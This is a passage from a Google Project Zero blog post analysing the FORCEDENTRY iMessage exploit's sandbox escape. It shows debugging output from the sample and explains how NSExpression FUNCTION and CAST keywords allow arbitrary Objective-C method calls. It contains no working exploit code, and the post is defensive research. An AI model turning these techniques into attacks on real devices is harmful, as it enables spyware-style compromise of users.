<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</div>
<div class='content-outer'>
<div class='content-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left content-fauxborder-left'>
<div class='fauxborder-right content-fauxborder-right'></div>
<div class='content-inner'>
<header>
<div class='header-outer'>
<div class='header-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left header-fauxborder-left'>
<div class='fauxborder-right header-fauxborder-right'></div>
<div class='region-inner header-inner'>
<div class='header section' id='header' name='Header'><div class='widget Header' data-version='1' id='Header1'>
<div id='header-inner'>
<div class='titlewrapper'>
<h1 class='title'>
<a href='https://googleprojectzero.blogspot.com/'>
Project Zero
</a>
</h1>
</div>
<div class='descriptionwrapper'>
<p class='description'><span>News and updates from the Project Zero team at Google</span></p>
</div>
</div>
</div></div>
</div>
</div>
<div class='header-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</header>
<div class='tabs-outer'>
<div class='tabs-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left tabs-fauxborder-left'>
<div class='fauxborder-right tabs-fauxborder-right'></div>
<div class='region-inner tabs-inner'>
<div class='tabs no-items section' id='crosscol' name='Cross-Column'></div>
<div class='tabs no-items section' id='crosscol-overflow' name='Cross-Column 2'></div>
</div>
</div>
<div class='tabs-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<div class='main-outer'>
<div class='main-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left main-fauxborder-left'>
<div class='fauxborder-right main-fauxborder-right'></div>
<div class='region-inner main-inner'>
<div class='columns fauxcolumns'>
<div class='fauxcolumn-outer fauxcolumn-center-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<div class='fauxcolumn-outer fauxcolumn-left-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<div class='fauxcolumn-outer fauxcolumn-right-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<!-- corrects IE6 width calculation -->
<div class='columns-inner'>
<div class='column-center-outer'>
<div class='column-center-inner'>
<div class='main section' id='main' name='Main'><div class='widget Blog' data-version='1' id='Blog1'>
<div class='blog-posts hfeed'>

          <div class="date-outer">
        
<h2 class='date-header'><span>Thursday, March 31, 2022</span></h2>

          <div class="date-posts">
        
<div class='post-outer'>
<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
<meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/s1200/image1%286%29.png' itemprop='image_url'/>
<meta content='4838136820032157985' itemprop='blogId'/>
<meta content='1353264177358891846' itemprop='postId'/>
<a name='1353264177358891846'></a>
<h3 class='post-title entry-title' itemprop='name'>
FORCEDENTRY: Sandbox Escape
</h3>
<div class='post-header'>
<div class='post-header-line-1'></div>
</div>
<div class='post-body entry-content' id='post-body-1353264177358891846' itemprop='description articleBody'>
<style type="text/css">ol{margin:0;padding:0}table td,table th{padding:0}.YDzVciBUld-c8{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.YDzVciBUld-c7{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.YDzVciBUld-c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.YDzVciBUld-c16{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:right}.YDzVciBUld-c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.YDzVciBUld-c10{color:#434343;text-decoration:none;vertical-align:baseline;font-size:14pt;font-style:normal}.YDzVciBUld-c13{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:italic}.YDzVciBUld-c9{color:#000000;text-decoration:none;vertical-align:baseline;font-size:16pt;font-style:normal}.YDzVciBUld-c2{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.YDzVciBUld-c6{-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline;text-decoration-skip-ink:none}.YDzVciBUld-c17{background-color:#b6d7a8;font-family:"Courier New";font-weight:700}.YDzVciBUld-c15{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.YDzVciBUld-c3{font-weight:400;font-family:"Arial"}.YDzVciBUld-c0{font-weight:400;font-family:"Courier New"}.YDzVciBUld-c11{color:inherit;text-decoration:inherit}.YDzVciBUld-c14{font-style:italic}.YDzVciBUld-c12{text-indent:36pt}.YDzVciBUld-c5{margin-left:36pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="YDzVciBUld-c15">
 <p class="YDzVciBUld-c4"><span>Posted by Ian Beer &amp; </span><span>Samuel Gro&szlig;</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;of Google Project Zero</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c13 YDzVciBUld-c3">We want to thank Citizen Lab for sharing a sample of the FORCEDENTRY exploit with us, and Apple&rsquo;s Security Engineering and Architecture (SEAR) group for collaborating with us on the technical analysis. Any editorial opinions reflected below are solely Project Zero&rsquo;s and do not necessarily reflect those of the organizations we collaborated with during this research.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Late last year </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html">we published a writeup</a></span><span>&nbsp;of the initial remote code execution stage of FORCEDENTRY, the zero-click iMessage exploit attributed by Citizen Lab to NSO.</span><span>&nbsp;By sending a </span><span class="YDzVciBUld-c0">.gif</span><span>&nbsp;iMessage attachment (which was really a PDF) NSO were able to remotely trigger a heap buffer overflow in the ImageIO JBIG2 decoder. They used that vulnerability to bootstrap a powerful </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://en.wikipedia.org/wiki/Weird_machine">weird machine</a></span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;capable of loading the next stage in the infection process: the sandbox escape.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">In this post we&#39;ll take a look at that sandbox escape. It&#39;s notable for using only logic bugs. In fact it&#39;s unclear where the features that it uses end and the vulnerabilities which it abuses begin. Both current and upcoming state-of-the-art mitigations such as Pointer Authentication and Memory Tagging have no impact at all on this sandbox escape.</span></p><h2 class="YDzVciBUld-c7" id="h.80ze3m83kn16"><span class="YDzVciBUld-c9 YDzVciBUld-c3">An observation</span></h2>
 <p class="YDzVciBUld-c4"><span>During our initial analysis of the </span><span class="YDzVciBUld-c0">.gif</span><span>&nbsp;file Samuel noticed that rendering the image appeared to leak memory.</span><span>&nbsp;Running the </span><span class="YDzVciBUld-c0">heap</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;tool after releasing all the associated resources gave the following output:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">$ heap $pid</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">------------------------------------------------------------</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">All zones: 4631 nodes (826336 bytes) &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp;COUNT &nbsp; &nbsp;BYTES &nbsp; &nbsp; AVG &nbsp; CLASS_NAME &nbsp; TYPE &nbsp; BINARY &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp;===== &nbsp; &nbsp;===== &nbsp; &nbsp; === &nbsp; ========== &nbsp; ==== &nbsp; ====== &nbsp; &nbsp; &nbsp; &nbsp;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; 1969 &nbsp; 469120 &nbsp; 238.3 &nbsp; non-object </span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">&nbsp; &nbsp; &nbsp;825 &nbsp; &nbsp;26400 &nbsp; &nbsp;32.0 &nbsp; JBIG2Bitmap &nbsp;C++ &nbsp; CoreGraphics</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">heap</span><span>&nbsp;was able to determine that the leaked memory contained </span><span class="YDzVciBUld-c0">JBIG2Bitmap</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;objects.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Using the </span><span class="YDzVciBUld-c0">-address</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;option we could find all the individual leaked bitmap objects:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">$ heap -address JBIG2Bitmap $pid</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>and dump them out to files. </span><span class="YDzVciBUld-c2 YDzVciBUld-c3">One of those objects was quite unlike the others:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">$ hexdump -C dumpXX.bin | head</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000000 &nbsp;62 70 6c 69 73 74 30 30 &nbsp;|bplist00|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">...</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000018 &nbsp; &nbsp; &nbsp; &nbsp;24 76 65 72 73 69 &nbsp;| &nbsp;$versi|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000020 &nbsp;6f 6e 59 24 61 72 63 68 &nbsp;|onY$arch|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000028 &nbsp;69 76 65 72 58 24 6f 62 &nbsp;|iverX$ob|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000030 &nbsp;6a 65 63 74 73 54 24 74 &nbsp;|jectsT$t|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000038 &nbsp;6f 70 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|op &nbsp; &nbsp; &nbsp;|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000040 &nbsp; &nbsp; &nbsp; &nbsp;4e 53 4b 65 79 65 &nbsp;| &nbsp;NSKeye|</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">00000048 &nbsp;64 41 72 63 68 69 76 65 &nbsp;|dArchive|</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>It&#39;s clearly a serialized </span><span class="YDzVciBUld-c6 YDzVciBUld-c0"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nskeyedarchiver?language=objc">NSKeyedArchiver</a></span><span>. Definitely not what you&#39;d expect to see in a </span><span class="YDzVciBUld-c0">JBIG2Bitmap</span><span>&nbsp;object. Running </span><span class="YDzVciBUld-c0">strings</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;we see plenty of interesting things (noting that the URL below is redacted):</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c3">Objective-C class and selector names:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSFunctionExpression</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSConstantValueExpression</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSConstantValue</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">expressionValueWithObject:context:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">filteredArrayUsingPredicate:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">_web_removeFileOnlyAtPath:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">context:evaluateMobileSubscriberIdentity:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">performSelectorOnMainThread:withObject:waitUntilDone:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c3">...</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c3">The name of the file which delivered the exploit:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">XXX.gif</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c3">Filesystems paths:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">/tmp/com.apple.messages</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">/System/Library/PrivateFrameworks/SlideshowKit.framework/Frameworks/OpusFoundation.framework</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c3">a URL:</span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c5"><span class="YDzVciBUld-c2 YDzVciBUld-c0">https://XXX.cloudfront.net/YYY/ZZZ/megalodon?AAA</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Using </span><span class="YDzVciBUld-c0">plutil</span><span>&nbsp;we can convert the </span><span class="YDzVciBUld-c0">bplist00</span><span>&nbsp;binary format to XML. Performing some post-processing and cleanup we can see that the top-level object in the </span><span class="YDzVciBUld-c0">NSKeyedArchiver</span><span>&nbsp;is a serialized </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;object.</span></p><h2 class="YDzVciBUld-c7" id="h.1ai2h2r4yshv"><span class="YDzVciBUld-c9 YDzVciBUld-c3">NSExpression NSPredicate NSExpression</span></h2>
 <p class="YDzVciBUld-c4"><span>If you&#39;ve ever used Core Data or tried to filter a Objective-C collection you might have come across </span><span class="YDzVciBUld-c0">NSPredicates</span><span>. </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nspredicate?language=objc">According to Apple&#39;s public documentation</a></span><span>&nbsp;they are used </span><span>&quot;</span><span class="YDzVciBUld-c14">to define logical conditions for constraining a search for a fetch or for in-memory filtering</span><span>&quot;</span><span class="YDzVciBUld-c13 YDzVciBUld-c3">.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>For example, in Objective-C you could filter an </span><span class="YDzVciBUld-c0">NSArray</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;object like this:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; NSArray* names = @[@&quot;one&quot;, @&quot;two&quot;, @&quot;three&quot;];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; NSPredicate* pred;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; pred = [NSPredicate predicateWithFormat:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; @&quot;</span><span class="YDzVciBUld-c17">SELF beginswith[c] &#39;t&#39;</span><span class="YDzVciBUld-c2 YDzVciBUld-c0">&quot;];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; NSLog(@&quot;%@&quot;, [names filteredArrayUsingPredicate:pred]);</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>The predicate is &quot;</span><span class="YDzVciBUld-c0">SELF beginswith[c] &#39;t&#39;&quot;</span><span>. This prints an </span><span class="YDzVciBUld-c0">NSArray</span><span>&nbsp;containing only &quot;</span><span class="YDzVciBUld-c0">two</span><span>&quot; and &quot;</span><span class="YDzVciBUld-c0">three</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&quot;.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">[NSPredicate predicateWithFormat]</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;builds a predicate object by parsing a small query language, a little like an SQL query. </span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">NSPredicates</span><span>&nbsp;can be built up from </span><span class="YDzVciBUld-c0">NSExpressions</span><span>, connected by </span><span class="YDzVciBUld-c0">NSComparisonPredicates</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;(like less-than, greater-than and so on.)</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">NSExpressions</span><span>&nbsp;themselves can be fairly complex, containing aggregate expressions (like &quot;</span><span class="YDzVciBUld-c0">IN</span><span>&quot; and &quot;</span><span class="YDzVciBUld-c0">CONTAINS</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&quot;), subqueries, set expressions, and, most interestingly, function expressions.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Prior to 2007 (in OS X 10.4 and below) function expressions were limited to just the following five extra built-in methods: </span><span class="YDzVciBUld-c0">sum</span><span>, </span><span class="YDzVciBUld-c0">count</span><span>, </span><span class="YDzVciBUld-c0">min</span><span>, </span><span class="YDzVciBUld-c0">max</span><span>, and </span><span class="YDzVciBUld-c0">average</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>But starting in OS X 10.5 (which would also be around the launch of iOS in 2007) </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span>&nbsp;were extended</span><span>&nbsp;</span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nsexpression">to allow </a></span><span class="YDzVciBUld-c6 YDzVciBUld-c14"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nsexpression">arbitrary</a></span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nsexpression">&nbsp;method invocations</a></span><span>&nbsp;with the </span><span class="YDzVciBUld-c0">FUNCTION</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;keyword:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &quot;FUNCTION(&#39;abc&#39;, &#39;stringByAppendingString&#39;, &#39;def&#39;)&quot; =&gt; @&quot;abcdef&quot;</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">FUNCTION</span><span>&nbsp;takes a target object, a selector and an optional list of arguments then invokes the selector on the object, passing the arguments. In this case it will allocate an </span><span class="YDzVciBUld-c0">NSString</span><span>&nbsp;object </span><span class="YDzVciBUld-c0">@&quot;abc&quot;</span><span>&nbsp;then invoke the </span><span class="YDzVciBUld-c0">stringByAppendingString:</span><span>&nbsp;selector passing the </span><span class="YDzVciBUld-c0">NSString</span><span>&nbsp;</span><span class="YDzVciBUld-c0">@&quot;def&quot;</span><span>, which will evaluate to the </span><span class="YDzVciBUld-c0">NSString</span><span>&nbsp;</span><span class="YDzVciBUld-c0">@&quot;abcdef&quot;</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>In addition to the </span><span class="YDzVciBUld-c0">FUNCTION</span><span>&nbsp;keyword there&#39;s </span><span class="YDzVciBUld-c0">CAST</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;which allows full reflection-based access to all Objective-C types (as opposed to just being able to invoke selectors on literal strings and integers):</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>&nbsp; &quot;</span><span class="YDzVciBUld-c2 YDzVciBUld-c0">FUNCTION(CAST(&#39;NSFileManager&#39;, &#39;Class&#39;), &#39;defaultManager&#39;)&quot;</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Here we can get access to the </span><span class="YDzVciBUld-c0">NSFileManager</span><span>&nbsp;class and call the </span><span class="YDzVciBUld-c0">defaultManager</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;selector to get a reference to a process&#39;s shared file manager instance.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>These keywords exist in the string representation of </span><span class="YDzVciBUld-c0">NSPredicates</span><span>&nbsp;and </span><span class="YDzVciBUld-c0">NSExpressions</span><span>. Parsing those strings involves creating a graph of </span><span class="YDzVciBUld-c0">NSExpression</span><span>&nbsp;objects, </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;objects and their subclasses like </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">. It&#39;s a serialized version of such a graph which is present in the JBIG2 bitmap.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">NSPredicates</span><span>&nbsp;using the </span><span class="YDzVciBUld-c0">FUNCTION</span><span>&nbsp;keyword are effectively Objective-C scripts. With some tricks it&#39;s possible to build nested function calls which can do almost anything you could do in procedural Objective-C. Figuring out some of those tricks was the key to the 2019 </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://realworldctf.com/">Real World CTF</a></span><span>&nbsp;</span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://github.com/ChiChou/DezhouInstrumenz/">DezhouInstrumenz</a></span><span>&nbsp;challenge, which would evaluate an attacker supplied </span><span class="YDzVciBUld-c0">NSExpression</span><span>&nbsp;format string. The </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://blog.chichou.me/2021/01/16/see-no-eval-runtime-code-execution-objc/">writeup by the challenge author</a></span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;is a great introduction to these ideas and I&#39;d strongly recommend reading that now if you haven&#39;t. The rest of this post builds on the tricks described in that post.</span></p><h2 class="YDzVciBUld-c7" id="h.lu8fbgty57ln"><span class="YDzVciBUld-c9 YDzVciBUld-c3">A tale of two parts</span></h2>
 <p class="YDzVciBUld-c4"><span>The only job of the JBIG2 logic gate machine described in the previous blog post is to cause the deserialization and evaluation of an embedded </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">. No attempt is made to get native code execution, ROP, JOP or any similar technique.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
